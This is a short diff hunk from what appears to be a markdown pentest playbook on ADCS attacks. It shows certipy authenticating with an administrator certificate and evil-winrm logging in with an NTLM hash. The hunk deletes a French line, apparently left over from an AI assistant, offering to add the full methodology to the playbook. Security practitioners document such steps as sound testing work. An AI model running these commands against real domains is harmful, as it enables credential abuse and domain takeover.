@@ -139,4 +139,3 @@ certipy auth -pfx 'administrator.pfx' -dc-ip <dc_ip>
 evil-winrm -i <target_ip> -u administrator -H '<ntlm_hash>'
 ```
 
-Tu veux que j'intègre cette méthodologie ADCS complète (phases + commandes) dans ton playbook markdown existant ?
